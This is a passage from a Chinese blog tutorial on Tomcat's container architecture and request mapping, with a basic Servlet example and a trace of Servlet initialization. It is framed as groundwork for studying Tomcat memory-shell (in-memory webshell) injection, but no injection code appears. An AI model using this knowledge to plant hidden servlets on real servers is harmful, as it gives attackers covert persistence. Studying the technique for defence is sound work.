<span class="attr">defaultHost</span>=<span class="string">&quot;localhost&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">&lt;!-- Realm：用户认证 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Realm</span> <span class="attr">className</span>=<span class="string">&quot;org.apache.catalina.realm.LockOutRealm&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Realm</span> <span class="attr">className</span>=<span class="string">&quot;org.apache.catalina.realm.UserDatabaseRealm&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">resourceName</span>=<span class="string">&quot;UserDatabase&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Realm</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">&lt;!-- Host：虚拟主机 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Host</span> <span class="attr">name</span>=<span class="string">&quot;localhost&quot;</span> <span class="attr">appBase</span>=<span class="string">&quot;webapps&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">unpackWARs</span>=<span class="string">&quot;true&quot;</span> <span class="attr">autoDeploy</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- 访问日志记录 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Valve</span> <span class="attr">className</span>=<span class="string">&quot;org.apache.catalina.valves.AccessLogValve&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">directory</span>=<span class="string">&quot;logs&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">prefix</span>=<span class="string">&quot;localhost_access_log&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">suffix</span>=<span class="string">&quot;.txt&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">pattern</span>=<span class="string">&quot;%h %l %u %t <span class="symbol">&amp;quot;</span>%r<span class="symbol">&amp;quot;</span> %s %b&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Host</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Engine</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Service</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Server</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>既然Tomcat设计了那么多个容器，在那么多个容器组合使用的时候，设想这样一个场景：我们此时要访问<a target="_blank" rel="noopener" href="https://manage.xxx.com:8080/user/list%EF%BC%8C%E9%82%A3%60tomcat%60%E6%98%AF%E6%80%8E%E4%B9%88%E7%A1%AE%E5%AE%9A%E8%AF%B7%E6%B1%82%E5%88%B0%E8%BE%BE%E7%9A%84%E6%98%AF%E9%82%A3%E4%B8%AAWrapper%E5%AE%B9%E5%99%A8%E4%B8%AD%E7%9A%84Servlet%E6%9D%A5%E5%A4%84%E7%90%86%E7%9A%84%EF%BC%9F%E4%B8%BA%E6%AD%A4%60tomcat%60%E8%AE%BE%E8%AE%A1%E4%BA%86%60Mapper%60%EF%BC%8C%E5%85%B6%E4%B8%AD%E4%BF%9D%E5%AD%98%E4%BA%86**%E5%AE%B9%E5%99%A8%E7%BB%84%E4%BB%B6%E4%B8%8E%E8%AE%BF%E9%97%AE%E8%B7%AF%E5%BE%84%E7%9A%84%E6%98%A0%E5%B0%84%E5%85%B3%E7%B3%BB**%E3%80%82">https://manage.xxx.com:8080/user/list，那`tomcat`是怎么确定请求到达的是那个Wrapper容器中的Servlet来处理的？为此`tomcat`设计了`Mapper`，其中保存了**容器组件与访问路径的映射关系**。</a></p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/20240112165824.png" alt="img"></p>
+<p>当我们发送请求时，一共会经过四个步骤</p>
+<ol>
+<li><p>根据协议和端口号选定<code>Service</code>和<code>Engine</code>。</p>
+<p>我们知道<code>Tomcat</code>的每个连接器都监听不同的端口，比如<code>Tomcat</code>默认的<code>HTTP</code>连接器监听<code>8080</code>端口、默认的<code>AJP</code>连接器监听<code>8009</code>端口。上面例子中的URL访问的是<code>8080</code>端口，因此这个请求会被<code>HTTP</code>连接器接收，而一个连接器是属于一个<code>Service</code>组件的，这样<code>Service</code>组件就确定了。我们还知道一个<code>Service</code>组件里除了有多个连接器，还有一个容器组件，具体来说就是一个<code>Engine</code>容器，因此<code>Service</code>确定了也就意味着<code>Engine</code>也确定了。</p>
+</li>
+<li><p>根据域名选定<code>Host</code>。</p>
+<p><code>Service</code>和<code>Engine</code>确定后，<code>Mapper</code>组件通过<code>url</code>中的域名去查找相应的<code>Host</code>容器，比如例子中的<code>url</code>访问的域名是<code>manage.xxx.com</code>，因此<code>Mapper</code>会找到<code>Host1</code>这个容器。</p>
+</li>
+<li><p>根据<code>url</code>路径找到<code>Context</code>组件。</p>
+<p><code>Host</code>确定以后，<code>Mapper</code>根据<code>url</code>的路径来匹配相应的<code>Web</code>应用的路径，比如例子中访问的是<code>/user</code>，因此找到了<code>Context1</code>这个<code>Context</code>容器。</p>
+</li>
+<li><p>根据<code>url</code>路径找到<code>Wrapper</code>（<code>Servlet</code>）。</p>
+<p><code>Context</code>确定后，<code>Mapper</code>再根据<code>web.xml</code>中配置的<code>Servlet</code>映射路径来找到具体的<code>Wrapper</code>和<code>Servlet</code>，例如这里的<code>Wrapper1</code>的<code>/list</code>。</p>
+</li>
+</ol>
+<h3 id="编写一个Servlet实操"><a href="#编写一个Servlet实操" class="headerlink" title="编写一个Servlet实操"></a>编写一个Servlet实操</h3><p>新建一个maven项目</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820172334266.png" alt="image-20250820172334266"></p>
+<p>创建好后目录是这样的</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820174043171.png" alt="image-20250820174043171"></p>
+<p>导入servlet-api依赖，修改pom.xml配置如下</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>TestServlet<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>war<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>TestServlet Maven Webapp<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.apache.org<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>TestServlet<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后写一个测试servlet的代码TestServlet.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>解释一下代码</p>
+<ul>
+<li><code>@WebServlet(&quot;/test&quot;)</code> 👉 表示这个 Servlet 访问路径是 **<code>http://服务器地址:端口/项目名/test</code>**。</li>
+<li><code>extends HttpServlet</code> 👉 继承自 <code>HttpServlet</code>，必须重写 <code>doGet</code> &#x2F; <code>doPost</code> 等方法才能处理请求。</li>
+<li><code>doGet</code> 👉 当浏览器发起 <strong>GET 请求</strong>（比如直接访问 URL）时，会执行这个方法。</li>
+<li><code>HttpServletRequest req</code> 👉 封装了请求的内容，比如 <code>req.getParameter(&quot;name&quot;)</code> 可以获取 URL 参数。</li>
+<li><code>HttpServletResponse resp</code> 👉 用于向客户端返回数据。</li>
+<li><code>resp.getWriter().write(&quot;Hello World&quot;);</code> 👉 向响应体里写入 <code>&quot;Hello World&quot;</code>。浏览器最终看到的就是这段文本。</li>
+</ul>
+<p>然后我们配置一下tomcat环境，先添加一个运行配置</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820174132969.png" alt="image-20250820174132969"></p>
+<p>然后点击右下角的修复去添加工件</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820174229022.png" alt="image-20250820174229022"></p>
+<p>添加后部署到tomcat服务器中，然后我们设置一下web模块和我们刚刚的工件绑定到一起</p>
+<p>随后我们配置一下web.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>TestServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.example.TestServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>TestServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/test<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>配置好后我们运行并访问&#x2F;testServlet&#x2F;test</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250819170710361.png" alt="image-20250819170710361"></p>
+<h3 id="从代码层面看Servlet的生命周期"><a href="#从代码层面看Servlet的生命周期" class="headerlink" title="从代码层面看Servlet的生命周期"></a>从代码层面看Servlet的生命周期</h3><p>在Servlet规范中，servlet的生命周期包括初始化阶段、运行阶段、销毁阶段</p>
+<p>Servlet 生命周期中 init 和 destroy 方法只会在 Servlet 实例创建和销毁时被调用一次，而 service 方法则会在每个请求到达时被调用一次。</p>
+<p>找到一个比较规范的图</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/8c038541f0fac542addcd5af51d43271.png" alt="img"></p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Servlet%E5%9E%8B/">https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Servlet%E5%9E%8B/</a></p>
+<p>实际上在Tomcat7之后的版本，StandardContext中就提供了动态注册Servlet的方法，但是并没有实现</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250819171716013.png" alt="image-20250819171716013"></p>
+<p>所以我们需要自己去实现动态添加servlet的功能，但是我们先来了解一下servlet的生命周期</p>
+<p>我们这里不采用我们下载的<code>tomcat</code>来运行我们的项目，我们使用嵌入式<code>tomcat</code>也就是所谓的<code>tomcat-embed-core</code>。</p>
+<p>我们把刚刚的pom.xml改一下</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ServletMemoryShell<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.108<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-jasper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.108<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后准备两个java文件</p>
+<p>一个用来启动Tomcat服务器，但是版本不一样的源码也不一样，具体参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42944840/article/details/116349603">https://blog.csdn.net/qq_42944840/article/details/116349603</a></p>
+<p>Main.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.LifecycleException;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.startup.Tomcat;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> LifecycleException &#123;</span><br><span class="line">        <span class="type">Tomcat</span> <span class="variable">tomcat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tomcat</span>();</span><br><span class="line">        tomcat.getConnector();  <span class="comment">//Tomcat9.0以上需要加入这个代码</span></span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> tomcat.addWebapp(<span class="string">&quot;&quot;</span>, <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;&quot;</span>).getAbsolutePath());</span><br><span class="line">        Tomcat.addServlet(context, <span class="string">&quot;TestServlet&quot;</span>, <span class="keyword">new</span> <span class="title class_">TestServlet</span>());</span><br><span class="line">        context.addServletMappingDecoded(<span class="string">&quot;/test&quot;</span>, <span class="string">&quot;TestServlet&quot;</span>);</span><br><span class="line">        tomcat.start();</span><br><span class="line">        tomcat.getServer().await();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>TestServlet.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@WebServlet(&quot;/test&quot;)//这是一个 **Servlet 注解**，告诉容器当访问 `/test` 路径时，应该使用 `TestServlet` 类来处理请求。相当于在 `web.xml` 中配置了一个 URL 映射。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;<span class="comment">//提供了默认的处理方式，你只需要重写 `doGet()`、`doPost()` 等方法来处理不同的请求。</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>);	<span class="comment">//设置响应内容的类型为&quot;text/html&quot;，表示响应内容是 HTML 格式的文本。</span></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();	<span class="comment">//获取响应的输出流 PrintWriter，用于将数据写入到响应体。</span></span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);<span class="comment">//向客户端响应输出 HTML 开始标签</span></span><br><span class="line">        out.println(<span class="string">&quot;Hello, World!&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>访问<a target="_blank" rel="noopener" href="http://localhost:8080/test%E5%B0%B1%E8%83%BD%E7%9C%8B%E5%88%B0%E8%BE%93%E5%87%BA%E4%BA%86">http://localhost:8080/test就能看到输出了</a></p>
+<h4 id="Servlet初始化流程分析"><a href="#Servlet初始化流程分析" class="headerlink" title="Servlet初始化流程分析"></a>Servlet初始化流程分析</h4><p>首先在<code>org.apache.catalina.core.StandardWrapper#setServletClass()</code>处下断点调试</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250819180233761.png" alt="image-20250819180233761"></p>
+<p>追踪一下这个函数的上层调用位，但是一开始找不到，maven连接一直超时，jar包都下不来</p>
+<p>不行啊实在太麻烦了，给一个个找的话太复杂了换个版本</p>
+<p>Tomcat 9.0.83</p>
+<p>上层调用位置位于<code>org.apache.catalina.startup.ContextConfig#configureContext</code></p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250819182631356.png" alt="image-20250819182631356"></p>
+<p>不难看到这个函数其实就是接收我们的web.xml文件内容并进行处理的函数，然后我们分析一下这段代码都干了什么</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820101935909.png" alt="image-20250820101935909"></p>
+<p>for循环开始先是利用webxml.getServlet()获取到所有的Servlet定义，然后createWrapper去创建一个Wrapper对象，之后利用setter和getter的方式去设置wrapper中servlet相关的属性，这里的话一个关键的属性就是load-on-startup属性，他会告诉tomcat是否在启动时立即加载并初始化该 Servlet。另外会获取到servlet的名称等等这些基础属性</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250820103355867.png" alt="image-20250820103355867"></p>
+<p>继续获取到servlet的完全限定类名，之后初始化这些参数添加到wrapper中，这些参数在初始化的时候会传递给servlet的init()初始化方法</p>
+<p>最后通过<code>context.addChild(wrapper);</code>将配置好的<code>Wrapper</code>添加到<code>Context</code>中，完成<code>Servlet</code>的初始化过程。</p>
+<p>上面大的<code>for</code>循环中嵌套的最后一个<code>for</code>循环则负责处理<code>Servlet</code>的<code>url</code>映射，调用<code>StandardContext.addServletMappingDecoded()</code>添加servlet对应的映射，将<code>Servlet</code>的<code>url</code>与<code>Servlet</code>名称关联起来。</p>
+<p>总的来说，Servlet的初始化主要经过了以下</p>
+<ul>
+<li><code>Wrapper wrapper = context.createWrapper();</code> 创建 Wapper 对象</li>
+<li><code>wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());</code> 设置的LoadOnStartUp 的值</li>
+<li><code>wrapper.setName(servlet.getServletName());</code>设置 Servlet 的 Name</li>
+<li><code>wrapper.setServletClass(servlet.getServletClass());</code>设置 Servlet 对应的 Class全限定类名</li>
+<li><code>context.addChild(wrapper);</code>将 Servlet 添加到 context 的 children 中</li>
+<li><code>context.addServletMappingDecoded(entry.getKey(), entry.getValue());</code>将 url 路径和 servlet 类做映射</li>
+</ul>
